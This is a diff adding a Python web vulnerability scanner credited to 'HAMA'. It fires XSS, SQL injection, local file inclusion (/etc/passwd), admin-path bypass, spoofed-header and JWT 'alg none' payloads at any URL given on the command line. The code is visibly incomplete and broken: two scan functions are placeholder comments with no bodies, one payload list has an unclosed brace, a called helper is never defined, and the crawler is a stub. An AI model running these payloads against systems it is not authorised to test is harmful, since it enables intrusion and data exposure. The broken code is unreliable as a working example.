@@ -1,0 +1,259 @@
+#!/usr/bin/env python3
+import sys
+import threading
+import time
+import random
+import re
+import argparse
+import os
+import json
+from urllib.parse import urljoin, urlparse, parse_qs, urlencode
+from concurrent.futures import ThreadPoolExecutor
+from time import sleep
+from collections import defaultdict
+
+# Check for required libraries
+try:
+    import requests
+    from bs4 import BeautifulSoup
+    from colorama import init, Fore, Style
+    from fake_useragent import UserAgent
+    from tldextract import extract
+except ImportError as e:
+    print(f"❌ Error: {e}")
+    print("💡 Run: pip install requests beautifulsoup4 colorama fake_useragent tldextract")
+    sys.exit(1)
+
+# Initialize Colorama
+init(autoreset=True)
+
+# ========== 🎨 UI & LOGGING ==========
+class UI:
+    @staticmethod
+    def banner():
+        print(Fore.CYAN + Style.BRIGHT + r"""
+╔════════════════════════════════════════════════════════════╗
+║    ██████╗ ██████╗ ██╗   ██╗███████╗█████╗ ███████╗      ║
+║   ██╔════╝██╔═══██╗██║   ██║██╔════╝██╔══██╗██╔════╝      ║
+║   ██║     ██║   ██║██║   ██║█████╗  ██████╔╝███████╗      ║
+║   ██║     ██║   ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗╚════██║      ║
+║   ╚██████╗╚██████╔╝ ╚████╔╝ ███████╗██║  ██║███████║      ║
+║    ╚═════╝ ╚═════╝   ╚═══╝  ╚══════╝╚═╝  ╚═╝╚══════╝      ║
+╠════════════════════════════════════════════════════════════╣
+║          Advanced Web Vulnerability Scanner v4.0           ║
+║                       By HAMA                               ║
+╚════════════════════════════════════════════════════════════╝
+""")
+
+    @staticmethod
+    def status(message, level="info"):
+        colors = {
+            "info": Fore.BLUE,
+            "success": Fore.GREEN,
+            "warning": Fore.YELLOW,
+            "error": Fore.RED
+        }
+        symbols = {
+            "info": "[ℹ]",
+            "success": "[✓]",
+            "warning": "[!]",
+            "error": "[✗]"
+        }
+        print(f"{Fore.WHITE}[{time.strftime('%H:%M:%S')}] {colors.get(level, Fore.WHITE)}{symbols.get(level, '')} {message}")
+
+    @staticmethod
+    def display_vuln(vuln):
+        print("\n" + "═" * 60)
+        print(f"{Fore.RED}🔥 {vuln['type']} DETECTED!{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}🔗 URL:{Style.RESET_ALL} {vuln['url']}")
+        
+        if vuln['type'] == "XSS":
+            print(f"{Fore.CYAN}📦 Payload:{Style.RESET_ALL} {vuln['payload']}")
+            if 'parameter' in vuln:
+                print(f"{Fore.CYAN}⚙ Parameter:{Style.RESET_ALL} {vuln['parameter']}")
+        
+        elif vuln['type'] == "Bypass":
+            print(f"{Fore.CYAN}🛠 Technique:{Style.RESET_ALL} {vuln['location']}")
+            print(f"{Fore.CYAN}📌 Payload:{Style.RESET_ALL} {vuln['payload']}")
+            print(f"{Fore.CYAN}🔓 Status:{Style.RESET_ALL} {vuln['status']}")
+        
+        print(f"{Fore.GREEN}✅ Confidence:{Style.RESET_ALL} {vuln['confidence']}")
+        print("═" * 60)
+
+# ========== ⚙ CONFIGURATION ==========
+DEFAULT_THREADS = 15
+DEFAULT_DEPTH = 3
+DEFAULT_TIMEOUT = 10
+REPORT_DIR = "scan_reports"
+
+# ========== 🎯 PAYLOADS ==========
+XSS_PAYLOADS = [
+    "<script>alert('XSS1')</script>",
+    "<img src=x onerror=alert('XSS2')>",
+    "'\"><svg/onload=alert('XSS3')>",
+    "javascript:alert('XSS4')"
+]
+
+BYPASS_PAYLOADS = [
+    "/.%2e/admin", "/..;/admin", "//admin/", "/admin..%2f",
+    "/admin?test=1", "/admin#", "/admin/.json", "/admin..;/"
+]
+
+BYPASS_HEADERS = {
+    "X-Original-URL": "/admin",
+    "X-Rewrite-URL": "/admin",
+    "X-Forwarded-For": "127.0.0.1",
+    "Referer": "https://google.com",
+    "X-Custom-IP-Authorization": "127.0.0.1"
+}
+
+JWT_PAYLOADS = [
+    {"alg": "none"},
+    {"alg": "HS256", "typ": "JWT"},
+    {"kid": "../../../../dev/null"
+]
+
+SQLI_PAYLOADS = [
+    "' OR 1=1--",
+    "' OR 'a'='a",
+    "admin'--",
+    "1' ORDER BY 1--"
+]
+
+LFI_PAYLOADS = [
+    "../../../../etc/passwd",
+    "....//....//etc/passwd",
+    "%2e%2e%2fetc%2fpasswd"
+]
+
+# ========== 🛡 SCANNER CORE ==========
+class Scanner:
+    def __init__(self):
+        self.stop_event = threading.Event()
+        self.visited = set()
+        self.lock = threading.Lock()
+        self.results = []
+        self.session = requests.Session()
+        self.ua = UserAgent()
+        self.session.headers.update({'User-Agent': self.ua.random})
+        self.report_data = []
+
+    def scan_xss(self, url, html=None):
+        # ... (original XSS scan code remains) ...
+
+    def scan_bypass(self, url):
+        # ... (original bypass scan code remains) ...
+
+    def scan_jwt(self, url):
+        """Check for JWT vulnerabilities (CVE-2020-28052, etc.)"""
+        try:
+            res = self.session.get(url, timeout=DEFAULT_TIMEOUT)
+            if "Bearer" in res.headers.get("Authorization", ""):
+                jwt_token = res.headers["Authorization"].split(" ")[1]
+                for payload in JWT_PAYLOADS:
+                    try:
+                        modified_token = self.modify_jwt(jwt_token, payload)
+                        headers = {"Authorization": f"Bearer {modified_token}"}
+                        res = self.session.get(url, headers=headers, timeout=DEFAULT_TIMEOUT)
+                        if res.status_code == 200:
+                            self.results.append({
+                                "type": "JWT Bypass",
+                                "url": url,
+                                "payload": str(payload),
+                                "confidence": "High"
+                            })
+                            UI.display_vuln(self.results[-1])
+                    except:
+                        continue
+        except:
+            pass
+
+    def scan_sqli(self, url):
+        """Detect SQL injection vulnerabilities"""
+        parsed = urlparse(url)
+        if parsed.query:
+            for param in parse_qs(parsed.query):
+                for payload in SQLI_PAYLOADS:
+                    test_url = url.replace(f"{param}=", f"{param}={payload}")
+                    try:
+                        res = self.session.get(test_url, timeout=DEFAULT_TIMEOUT)
+                        if "error in your SQL syntax" in res.text.lower():
+                            self.results.append({
+                                "type": "SQLi",
+                                "url": test_url,
+                                "payload": payload,
+                                "confidence": "High"
+                            })
+                            UI.display_vuln(self.results[-1])
+                    except:
+                        continue
+
+    def scan_lfi(self, url):
+        """Local File Inclusion checks"""
+        for payload in LFI_PAYLOADS:
+            test_url = url + payload
+            try:
+                res = self.session.get(test_url, timeout=DEFAULT_TIMEOUT)
+                if "root:" in res.text:
+                    self.results.append({
+                        "type": "LFI",
+                        "url": test_url,
+                        "payload": payload,
+                        "confidence": "High"
+                    })
+                    UI.display_vuln(self.results[-1])
+            except:
+                continue
+
+    def generate_report(self):
+        """Generate HTML report for Termux"""
+        if not os.path.exists(REPORT_DIR):
+            os.makedirs(REPORT_DIR)
+        
+        report_path = os.path.join(REPORT_DIR, f"scan_{time.strftime('%Y%m%d_%H%M%S')}.html")
+        with open(report_path, 'w') as f:
+            f.write("<html><body><h1>Scan Report</h1>")
+            for vuln in self.results:
+                f.write(f"<div style='border:1px solid #ccc; padding:10px; margin:5px;'>")
+                f.write(f"<h3>{vuln['type']}</h3>")
+                f.write(f"<p><b>URL:</b> {vuln['url']}</p>")
+                f.write(f"<p><b>Payload:</b> {vuln.get('payload', 'N/A')}</p>")
+                f.write("</div>")
+            f.write("</body></html>")
+        
+        UI.status(f"Report saved to: {report_path}", "success")
+
+    def crawl(self, url, depth=3, threads=10):
+        # ... (original crawl code enhanced with new scans) ...
+        self.scan_jwt(url)
+        self.scan_sqli(url)
+        self.scan_lfi(url)
+
+# ========== 🚀 MAIN EXECUTION ==========
+if __name__ == "__main__":
+    UI.banner()
+    scanner = Scanner()
+    
+    parser = argparse.ArgumentParser(description="HAMA's Web Vulnerability Scanner")
+    parser.add_argument("url", help="Target URL (e.g., http://example.com)")
+    parser.add_argument("-t", "--threads", type=int, default=DEFAULT_THREADS, help="Threads (default: 15)")
+    parser.add_argument("-d", "--depth", type=int, default=DEFAULT_DEPTH, help="Crawl depth (default: 3)")
+    parser.add_argument("-r", "--report", action="store_true", help="Generate HTML report")
+    args = parser.parse_args()
+
+    try:
+        UI.status(f"Starting scan on {args.url}", "info")
+        scanner.crawl(args.url, depth=args.depth, threads=args.threads)
+        
+        if args.report:
+            scanner.generate_report()
+        
+        if not scanner.results:
+            UI.status("No vulnerabilities found!", "warning")
+        else:
+            UI.status(f"Scan complete! Found {len(scanner.results)} vulnerabilities!", "success")
+                
+    except KeyboardInterrupt:
+        UI.status("Scan stopped by user", "error")
+    except Exception as e:
+        UI.status(f"Fatal error: {e}", "error")
